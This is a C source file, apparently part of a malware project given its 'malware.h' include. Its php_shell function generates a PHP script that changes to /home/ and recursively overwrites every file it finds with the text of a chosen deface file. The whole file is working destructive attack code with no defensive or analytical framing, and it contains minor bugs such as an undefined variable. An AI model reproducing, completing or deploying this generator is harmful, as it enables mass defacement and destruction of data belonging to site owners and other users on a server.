#include "malware.h"

void php_shell(char* Tname, char* defaceFileAdress)
{
        mkdir(Tname, 0764);

	FILE* fileAddr = fopen(defaceFileAdress, "r");
	chdir(Tname);
	FILE* targAddr = fopen(Tname, "w");

	if(fileAddr == NULL) exit(1);
	
	fputs(
		"<?php\n"
		"	function type($addr)\n"
		"	{\n"
		"		if(is_dir($addr)) return \"dir\";\n"
		"		if(is_file($addr)) return \"file\";\n"
		"\n"
		"		$a = getimagesize($str);\n"
		"		$image_type = $a[2];\n"
		"	\n"
		"		if(in_array($image_type , array(IMAGETYPE_GIF , IMAGETYPE_JPEG ,IMAGETYPE_PNG , IMAGETYPE_BMP)))\n"
		"			return \"image\";\n"
		"		return \"another\";\n"
		"		\n"
		"	}\n"
		"\n"
		"	chdir(\"/home/\");\n"
		"\n"
		"	function diface()\n"
		"	{\n"
		"		$d = opendir(getcwd());\n"
		"\n"
		"		while($tmp = readdir($d))\n"
		"		{\n"
		"			if($tmp != \".\" && $tmp != \"..\")\n"
		"			{\n"
		"				if(type($tmp) != \"dir\")\n"
		"				{\n"
		"					fwrite(fopen($tmp, \"w\"), (\n\""
	,
	targAddr);

	while(1)
	{
		int tmp = fgetc(fileAddr);
		if(feof(fileAddr)) break;
		else if(tmp == '\n')
		{
			fprintf(targAddr, "\"");
			fputc('\n', targAddr);
			fprintf(targAddr, "\"");
		}else if(tmp == '\'') fprintf(targAddr, "\\'");
		else	fputc(tmp , targAddr);
	}

	fputs(
		"\"\n));\n"
		"				}\n"
		"\n"
		"				if(type($tmp) == \"dir\" || is_dir($tmp))\n"
		"				{\n"
		"					chdir($tmp);\n"
		"					diface();\n"
		"					chdir(\"..\");\n"
		"				}\n"
		"			}\n"
		"		}\n"
		"\n"
		"		closedir($d);\n"
		"	}\n"
		"\n"
		"	diface();\n"
		"?>\n"
		"\n"
	,targAddr);

	fclose(fileAddr);
	fclose(targAddr);	
} 
